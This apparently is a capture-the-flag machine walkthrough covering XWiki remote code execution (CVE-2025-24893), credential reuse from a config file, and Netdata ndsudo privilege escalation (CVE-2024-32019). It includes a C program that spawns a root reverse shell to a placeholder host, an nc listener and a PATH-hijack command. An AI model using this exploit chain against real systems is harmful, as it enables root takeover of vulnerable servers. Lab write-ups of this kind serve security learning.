The first thing I did was an nmap scan
<img width="657" height="263" alt="Pasted image 20250817150407 1" src="https://github.com/user-attachments/assets/370e9cdd-c88e-48a8-936d-60d413a20b21" />
we have port 8080, and it is vulnerable to an exploit

CVE-2025–24893
remote code execution (RCE)

Next, we use this exploit and we are able to obtain a reverse shell
<img width="1036" height="570" alt="Pasted image 20250817151443" src="https://github.com/user-attachments/assets/bdb0e239-1907-43c9-82bf-f5ea7a2c3b75" />

Now we are the user xwiki and we need to gain privilege escalation to another user.
In the path we found a single user directory named Oliver, so we determined that this is the next target /home.

After looking around the xwiki files, we found a password in
/etc/xwiki/hibernate.cfg.xml

<img width="1251" height="158" alt="Pasted image 20250817152623" src="https://github.com/user-attachments/assets/83d7317a-0383-4711-82cb-f5e2c8bbaf1c" />
theEd1t0rTeam99

Thanks to this, we have access to oliver and we can obtain the user flag
<img width="963" height="595" alt="Pasted image 20250817153438" src="https://github.com/user-attachments/assets/4c0adfa1-4ee0-450e-a09e-f92d62349dc1" />

Privilege Escalation

Running checks showed that Oliver does not have permission to run any command as root — no binaries with elevated privileges like sometimes happens on other machines.
sudo -l

<img width="391" height="77" alt="Pasted image 20250817153841" src="https://github.com/user-attachments/assets/ecfbe0c3-8d0b-47a1-87ea-3d81346f29e3" />

Since I now had SSH access, I checked internal services using port forwarding

<img width="618" height="308" alt="Pasted image 20250817154035" src="https://github.com/user-attachments/assets/1f55b97f-3518-4447-83f2-3250382568ef" />

After checking local ports, I saw that port 127.0.0.1:19999 is used by Netdata, so I created an SSH tunnel: 19999

At the moment I opened the Netdata web page, a big warning appeared saying that the version is outdated — a great hint that it might be vulnerable

CVE-2024–32019

This vulnerability allows local privilege escalation (LPE)

We can create a fake binary that is executed instead of the real one when it tries to call .nvme, ndsudo, nvme-list.
Here is a simple malicious C program that does this:

```
#include <unistd.h> 
#include <stddef.h> 

int main() {  
    setuid(0);  
    setgid(0);  
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1", NULL);  
    return 0;  
}
```

We compile it statically to avoid issues

<pre> x86_64-linux-gnu-gcc -o nvme exploit.c -static </pre>


Next, upload it to the victim machine, make sure it is executable, and set the variable so that our fake binary is found first

scp nvme oliver@10.10.11.80:/home/oliver/


Set up a listener

nc -lvnp port

```
chmod +x nvme
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

![[Zrzut ekranu 2025-08-17 163515.png]]

After execution, our reverse shell is launched and we get root via ndsudo
And then just cat /root/root.txt and that’s it!

![[Pasted image 20250817163802.png]]
